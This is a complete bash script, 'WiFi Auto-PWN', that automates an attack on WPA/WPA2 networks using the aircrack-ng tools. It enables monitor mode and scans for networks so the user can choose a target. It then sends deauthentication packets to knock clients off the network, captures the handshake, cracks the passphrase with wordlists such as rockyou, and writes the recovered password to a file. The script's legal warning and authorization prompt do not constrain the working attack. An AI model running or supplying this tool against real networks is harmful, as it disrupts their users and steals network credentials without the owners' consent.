#!/bin/bash

################################################################################
# WiFi Auto-PWN - Automated WiFi Penetration Testing
# 
# Description: Complete WiFi attack automation using aircrack-ng suite
# Features:
#   - Automatic interface detection and monitor mode setup
#   - Network scanning and target selection
#   - Deauthentication attack to capture handshake
#   - Automatic password cracking with wordlist
#   - Clean interface restoration
#
# Usage: sudo ./wifi-autopwn.sh [OPTIONS]
#
# WARNING: This tool is for authorized penetration testing only.
#          Unauthorized access to computer networks is illegal.
################################################################################

set -e  # Exit on error

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global variables
INTERFACE=""
MONITOR_INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
HANDSHAKE_FILE=""
OUTPUT_DIR="./wifi-captures"
WORDLIST=""  # Will be auto-detected
DEAUTH_COUNT=10
CAPTURE_DURATION=60

################################################################################
# Utility Functions
################################################################################

print_banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                    WiFi Auto-PWN v1.0                        ║"
    echo "║          Automated WiFi Penetration Testing Tool            ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

log_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[✗]${NC} $1"
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root (use sudo)"
        exit 1
    fi
}

check_dependencies() {
    log_info "Checking required tools..."
    
    local tools=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng")
    local missing=()
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing[*]}"
        log_info "Install with: sudo apt install aircrack-ng"
        exit 1
    fi
    
    log_success "All required tools found"
}

check_wordlist() {
    # If wordlist already specified via -w flag, verify it exists
    if [ -n "$WORDLIST" ]; then
        if [ ! -f "$WORDLIST" ]; then
            log_error "Specified wordlist not found: $WORDLIST"
            exit 1
        fi
        log_success "Using wordlist: $WORDLIST"
        return
    fi
    
    log_info "Auto-detecting best available wordlist..."
    
    # Priority order: WiFi-specific wordlists first, then general wordlists
    local wordlist_candidates=(
        "/usr/share/wordlists/wifite.txt"              # Best for WiFi (8-63 chars)
        "/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"  # WiFi top passwords
        "/usr/share/wordlists/fasttrack.txt"           # Common passwords
        "/usr/share/wordlists/rockyou.txt"             # General large wordlist
        "/usr/share/wordlists/rockyou.txt.gz"          # Compressed rockyou
    )
    
    for candidate in "${wordlist_candidates[@]}"; do
        if [ -f "$candidate" ]; then
            # Handle compressed rockyou
            if [[ "$candidate" == *.gz ]]; then
                log_info "Extracting rockyou.txt.gz..."
                sudo gunzip "$candidate" 2>/dev/null || true
                WORDLIST="${candidate%.gz}"
                if [ -f "$WORDLIST" ]; then
                    log_success "Using wordlist: $WORDLIST"
                    return
                fi
            else
                WORDLIST="$candidate"
                log_success "Using wordlist: $WORDLIST"
                return
            fi
        fi
    done
    
    # If no wordlist found, prompt user
    log_error "No suitable wordlist found on system"
    log_info "Suggested wordlists for WiFi:"
    log_info "  - /usr/share/wordlists/wifite.txt (WiFi-specific)"
    log_info "  - /usr/share/wordlists/rockyou.txt (general)"
    echo ""
    read -p "Enter path to custom wordlist: " WORDLIST
    
    if [ ! -f "$WORDLIST" ]; then
        log_error "Wordlist not found: $WORDLIST"
        exit 1
    fi
    
    log_success "Using wordlist: $WORDLIST"
}

################################################################################
# Interface Management
################################################################################

list_interfaces() {
    log_info "Available wireless interfaces:"
    echo ""
    
    local interfaces=($(iw dev | grep Interface | awk '{print $2}'))
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        log_error "No wireless interfaces found"
        exit 1
    fi
    
    local i=1
    for iface in "${interfaces[@]}"; do
        local driver=$(ethtool -i "$iface" 2>/dev/null | grep driver | awk '{print $2}')
        echo -e "  ${GREEN}[$i]${NC} $iface (Driver: $driver)"
        ((i++))
    done
    
    echo ""
}

select_interface() {
    list_interfaces
    
    local interfaces=($(iw dev | grep Interface | awk '{print $2}'))
    
    while true; do
        read -p "Select interface number [1]: " selection
        selection=${selection:-1}
        
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -le "${#interfaces[@]}" ]; then
            INTERFACE="${interfaces[$((selection-1))]}"
            log_success "Selected interface: $INTERFACE"
            break
        else
            log_error "Invalid selection"
        fi
    done
}

enable_monitor_mode() {
    log_info "Killing interfering processes..."
    airmon-ng check kill > /dev/null 2>&1
    
    log_info "Enabling monitor mode on $INTERFACE..."
    
    # Start monitor mode
    airmon-ng start "$INTERFACE" > /dev/null 2>&1
    
    # The monitor interface is usually named wlan0mon or similar
    MONITOR_INTERFACE="${INTERFACE}mon"
    
    # Check if monitor interface exists
    if ! iw dev | grep -q "$MONITOR_INTERFACE"; then
        # Try alternative naming
        MONITOR_INTERFACE=$(iw dev | grep "type monitor" -B 1 | grep Interface | awk '{print $2}' | head -1)
    fi
    
    if [ -z "$MONITOR_INTERFACE" ]; then
        log_error "Failed to enable monitor mode"
        exit 1
    fi
    
    log_success "Monitor mode enabled: $MONITOR_INTERFACE"
}

disable_monitor_mode() {
    if [ -n "$MONITOR_INTERFACE" ]; then
        log_info "Disabling monitor mode..."
        airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1
        log_success "Monitor mode disabled"
        
        log_info "Restarting network services..."
        systemctl restart NetworkManager 2>/dev/null || service network-manager restart 2>/dev/null || true
    fi
}

################################################################################
# Network Scanning
################################################################################

scan_networks() {
    log_info "Scanning for WiFi networks (press Ctrl+C after ~30 seconds)..."
    log_warning "Let it run for at least 20-30 seconds to discover networks"
    
    mkdir -p "$OUTPUT_DIR"
    local scan_file="$OUTPUT_DIR/scan-01"
    
    # Remove old scan files
    rm -f "$OUTPUT_DIR"/scan-* 2>/dev/null
    
    echo ""
    log_info "Starting airodump-ng..."
    echo -e "${YELLOW}Press Ctrl+C when you see your target network${NC}"
    echo ""
    
    # Run airodump-ng and capture output
    timeout 30 airodump-ng "$MONITOR_INTERFACE" -w "$scan_file" --output-format csv 2>/dev/null || true
    
    # Wait a moment for file to be written
    sleep 2
    
    if [ ! -f "${scan_file}-01.csv" ]; then
        log_error "Scan file not created. Retrying..."
        airodump-ng "$MONITOR_INTERFACE" -w "$scan_file" --output-format csv &
        local pid=$!
        sleep 20
        kill $pid 2>/dev/null || true
        sleep 2
    fi
}

parse_and_select_target() {
    local scan_file="${OUTPUT_DIR}/scan-01-01.csv"
    
    if [ ! -f "$scan_file" ]; then
        log_error "Scan results not found"
        exit 1
    fi
    
    # Display filter options
    echo ""
    log_info "Network Filter Options:"
    echo ""
    echo "  1) Show all networks"
    echo "  2) Show only WPA/WPA2 networks (recommended)"
    echo "  3) Show networks with signal > -70 dBm"
    echo "  4) Custom filter"
    echo ""
    
    read -p "Select filter option [2]: " filter_choice
    filter_choice=${filter_choice:-2}
    
    local min_power=-100
    local encryption_filter=""
    
    case $filter_choice in
        1)
            log_info "Showing all networks"
            ;;
        2)
            encryption_filter="WPA"
            log_info "Filtering for WPA/WPA2 networks only"
            ;;
        3)
            min_power=-70
            log_info "Filtering for networks with signal > -70 dBm"
            ;;
        4)
            read -p "Minimum signal strength (e.g., -70): " min_power
            min_power=${min_power:--100}
            read -p "Encryption filter (WPA/WEP/OPN, or leave blank): " encryption_filter
            ;;
    esac
    
    echo ""
    log_info "Sort Options:"
    echo ""
    echo "  1) Sort by signal strength (strongest first)"
    echo "  2) Sort by channel"
    echo "  3) No sorting (order discovered)"
    echo ""
    
    read -p "Select sort option [1]: " sort_choice
    sort_choice=${sort_choice:-1}
    
    log_info "Parsing networks from scan..."
    echo ""
    
    # Parse CSV and collect networks
    local networks=()
    local network_details=()
    
    while IFS=, read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        # Skip header and empty lines
        if [[ "$bssid" =~ ^[0-9A-F]{2}:[0-9A-F]{2} ]]; then
            # Clean up fields
            bssid=$(echo "$bssid" | tr -d ' ')
            channel=$(echo "$channel" | tr -d ' ')
            power=$(echo "$power" | tr -d ' ')
            essid=$(echo "$essid" | tr -d ' ')
            privacy=$(echo "$privacy" | tr -d ' ')
            
            # Skip if no ESSID
            if [ -z "$essid" ] || [ "$essid" == "" ]; then
                essid="<Hidden SSID>"
            fi
            
            # Apply encryption filter
            if [ -n "$encryption_filter" ]; then
                if [[ ! "$privacy" =~ $encryption_filter ]]; then
                    continue
                fi
            fi
            
            # Apply signal strength filter
            if [ -n "$power" ] && [ "$power" -lt "$min_power" ]; then
                continue
            fi
            
            # Store network info with all details
            network_details+=("$power|$channel|$bssid|$essid|$privacy")
        fi
    done < "$scan_file"
    
    if [ ${#network_details[@]} -eq 0 ]; then
        log_error "No networks found matching filter criteria"
        log_warning "Try different filter options"
        
        read -p "Scan again? (y/n): " retry
        if [ "$retry" = "y" ] || [ "$retry" = "Y" ]; then
            scan_networks
            parse_and_select_target
        else
            cleanup_and_exit
        fi
        return
    fi
    
    # Sort networks based on choice
    case $sort_choice in
        1)
            # Sort by signal strength (strongest first = highest number)
            IFS=$'\n' network_details=($(sort -t'|' -k1 -rn <<< "${network_details[*]}"))
            ;;
        2)
            # Sort by channel
            IFS=$'\n' network_details=($(sort -t'|' -k2 -n <<< "${network_details[*]}"))
            ;;
        3)
            # No sorting
            ;;
    esac
    
    # Display networks
    log_success "Available networks (${#network_details[@]} found):"
    echo ""
    printf "  ${CYAN}%-4s %-18s  %-4s  %-6s  %-12s  %s${NC}\n" "NUM" "BSSID" "CH" "POWER" "ENCRYPTION" "ESSID"
    printf "  ${CYAN}%-4s %-18s  %-4s  %-6s  %-12s  %s${NC}\n" "---" "------------------" "----" "------" "------------" "-----"
    
    local i=1
    for network in "${network_details[@]}"; do
        local power=$(echo "$network" | cut -d'|' -f1)
        local channel=$(echo "$network" | cut -d'|' -f2)
        local bssid=$(echo "$network" | cut -d'|' -f3)
        local essid=$(echo "$network" | cut -d'|' -f4)
        local privacy=$(echo "$network" | cut -d'|' -f5)
        
        # Color code by signal strength
        local power_color="${RED}"
        if [ "$power" -gt -60 ]; then
            power_color="${GREEN}"
        elif [ "$power" -gt -70 ]; then
            power_color="${YELLOW}"
        fi
        
        printf "  ${GREEN}[%2d]${NC} %-18s  ${BLUE}%-4s${NC}  ${power_color}%-6s${NC}  ${MAGENTA}%-12s${NC}  %s\n" \
            "$i" "$bssid" "$channel" "$power" "$privacy" "$essid"
        ((i++))
    done
    
    echo ""
    
    # Select target
    while true; do
        read -p "Select target network number (or 'r' to rescan): " selection
        
        if [ "$selection" = "r" ] || [ "$selection" = "R" ]; then
            scan_networks
            parse_and_select_target
            return
        fi
        
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -le "${#network_details[@]}" ]; then
            local network="${network_details[$((selection-1))]}"
            TARGET_BSSID=$(echo "$network" | cut -d'|' -f3)
            TARGET_CHANNEL=$(echo "$network" | cut -d'|' -f2)
            TARGET_ESSID=$(echo "$network" | cut -d'|' -f4)
            local target_enc=$(echo "$network" | cut -d'|' -f5)
            
            echo ""
            log_success "Selected Target:"
            log_success "  ESSID: $TARGET_ESSID"
            log_success "  BSSID: $TARGET_BSSID"
            log_success "  Channel: $TARGET_CHANNEL"
            log_success "  Encryption: $target_enc"
            echo ""
            
            read -p "Proceed with this target? (y/n): " confirm
            if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
                break
            else
                echo ""
                log_info "Selection cancelled, choose again..."
                echo ""
            fi
        else
            log_error "Invalid selection"
        fi
    done
}

################################################################################
# Handshake Capture
################################################################################

capture_handshake() {
    log_info "Starting handshake capture for $TARGET_ESSID..."
    
    HANDSHAKE_FILE="$OUTPUT_DIR/${TARGET_ESSID//[^a-zA-Z0-9]/_}"
    
    # Remove old capture files
    rm -f "${HANDSHAKE_FILE}"* 2>/dev/null
    
    # Start airodump-ng on target channel
    log_info "Monitoring channel $TARGET_CHANNEL..."
    airodump-ng --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" -w "$HANDSHAKE_FILE" "$MONITOR_INTERFACE" &
    local airodump_pid=$!
    
    sleep 5
    
    # Perform deauth attack
    log_warning "Sending deauthentication packets to force handshake..."
    log_info "Deauth count: $DEAUTH_COUNT packets"
    
    aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$MONITOR_INTERFACE" > /dev/null 2>&1 &
    local aireplay_pid=$!
    
    # Wait for handshake
    log_info "Waiting for handshake (timeout: ${CAPTURE_DURATION}s)..."
    log_warning "If devices are connected to the network, handshake should be captured soon"
    
    local elapsed=0
    local handshake_captured=false
    
    while [ $elapsed -lt $CAPTURE_DURATION ]; do
        sleep 5
        ((elapsed+=5))
        
        # Check if handshake is captured
        if aircrack-ng "${HANDSHAKE_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
            handshake_captured=true
            log_success "Handshake captured!"
            break
        fi
        
        echo -ne "\r${BLUE}[*]${NC} Elapsed: ${elapsed}s / ${CAPTURE_DURATION}s"
    done
    
    echo ""
    
    # Stop processes
    kill $airodump_pid 2>/dev/null || true
    kill $aireplay_pid 2>/dev/null || true
    
    sleep 2
    
    if [ "$handshake_captured" = false ]; then
        log_error "Handshake not captured within timeout"
        log_warning "Possible reasons:"
        log_warning "  - No clients connected to the network"
        log_warning "  - Clients didn't reconnect after deauth"
        log_warning "  - Signal too weak"
        
        read -p "Try again? (y/n): " retry
        if [ "$retry" = "y" ] || [ "$retry" = "Y" ]; then
            capture_handshake
        else
            cleanup_and_exit
        fi
    fi
}

################################################################################
# Password Cracking
################################################################################

crack_password() {
    log_info "Starting password cracking..."
    log_info "This may take a while depending on password complexity and wordlist size"
    
    local cap_file=$(ls "${HANDSHAKE_FILE}"*.cap 2>/dev/null | head -1)
    
    if [ -z "$cap_file" ]; then
        log_error "Capture file not found"
        exit 1
    fi
    
    log_info "Using wordlist: $WORDLIST"
    echo ""
    
    # Run aircrack-ng
    aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "$cap_file" | tee "$OUTPUT_DIR/crack_result.txt"
    
    echo ""
    
    # Check if password was found
    if grep -q "KEY FOUND" "$OUTPUT_DIR/crack_result.txt"; then
        local password=$(grep "KEY FOUND" "$OUTPUT_DIR/crack_result.txt" | sed 's/.*\[ \(.*\) \]/\1/')
        echo ""
        log_success "═══════════════════════════════════════════════════"
        log_success "PASSWORD FOUND: $password"
        log_success "  Network: $TARGET_ESSID"
        log_success "  BSSID: $TARGET_BSSID"
        log_success "═══════════════════════════════════════════════════"
        echo ""
        
        # Save to file
        echo "Network: $TARGET_ESSID" > "$OUTPUT_DIR/cracked_password.txt"
        echo "BSSID: $TARGET_BSSID" >> "$OUTPUT_DIR/cracked_password.txt"
        echo "Password: $password" >> "$OUTPUT_DIR/cracked_password.txt"
        echo "Date: $(date)" >> "$OUTPUT_DIR/cracked_password.txt"
        
        log_success "Results saved to: $OUTPUT_DIR/cracked_password.txt"
    else
        log_error "Password not found in wordlist"
        log_warning "Try using a larger wordlist or custom wordlist specific to target"
    fi
}

################################################################################
# Cleanup
################################################################################

cleanup_and_exit() {
    echo ""
    log_info "Cleaning up..."
    
    # Kill any remaining aircrack processes
    pkill airodump-ng 2>/dev/null || true
    pkill aireplay-ng 2>/dev/null || true
    
    # Disable monitor mode
    disable_monitor_mode
    
    log_success "Cleanup complete"
    exit 0
}

# Trap Ctrl+C
trap cleanup_and_exit SIGINT SIGTERM

################################################################################
# Main Function
################################################################################

show_usage() {
    echo "Usage: sudo $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -i INTERFACE    Wireless interface to use"
    echo "  -w WORDLIST     Path to wordlist (default: auto-detect, prefers wifite.txt)"
    echo "  -d COUNT        Deauth packet count (default: 10)"
    echo "  -t TIMEOUT      Handshake capture timeout in seconds (default: 60)"
    echo "  -h              Show this help message"
    echo ""
    echo "Example:"
    echo "  sudo $0 -i wlan0 -d 20 -t 120"
    echo ""
}

parse_arguments() {
    while getopts "i:w:d:t:h" opt; do
        case $opt in
            i) INTERFACE="$OPTARG" ;;
            w) WORDLIST="$OPTARG" ;;
            d) DEAUTH_COUNT="$OPTARG" ;;
            t) CAPTURE_DURATION="$OPTARG" ;;
            h) show_usage; exit 0 ;;
            *) show_usage; exit 1 ;;
        esac
    done
}

main() {
    print_banner
    
    # Parse arguments
    parse_arguments "$@"
    
    # Pre-flight checks
    check_root
    check_dependencies
    check_wordlist
    
    # Legal warning
    echo ""
    log_warning "═══════════════════════════════════════════════"
    log_warning "         LEGAL AND ETHICAL WARNING"
    log_warning "═══════════════════════════════════════════════"
    echo ""
    echo "This tool is intended for:"
    echo "  • Authorized penetration testing"
    echo "  • Educational purposes on your own networks"
    echo "  • Security research with proper authorization"
    echo ""
    echo "Unauthorized access to networks is ILLEGAL and may"
    echo "result in criminal prosecution."
    echo ""
    read -p "Do you have authorization to test this network? (yes/no): " confirm
    
    if [ "$confirm" != "yes" ]; then
        log_error "Authorization not confirmed. Exiting."
        exit 1
    fi
    
    echo ""
    
    # Create output directory
    mkdir -p "$OUTPUT_DIR"
    log_success "Output directory: $OUTPUT_DIR"
    
    # Step 1: Select interface
    if [ -z "$INTERFACE" ]; then
        select_interface
    else
        log_info "Using interface: $INTERFACE"
    fi
    
    # Step 2: Enable monitor mode
    enable_monitor_mode
    
    # Step 3: Scan networks
    scan_networks
    
    # Step 4: Select target
    parse_and_select_target
    
    # Step 5: Capture handshake
    capture_handshake
    
    # Step 6: Crack password
    crack_password
    
    # Cleanup
    cleanup_and_exit
}

# Run main function
main "$@"
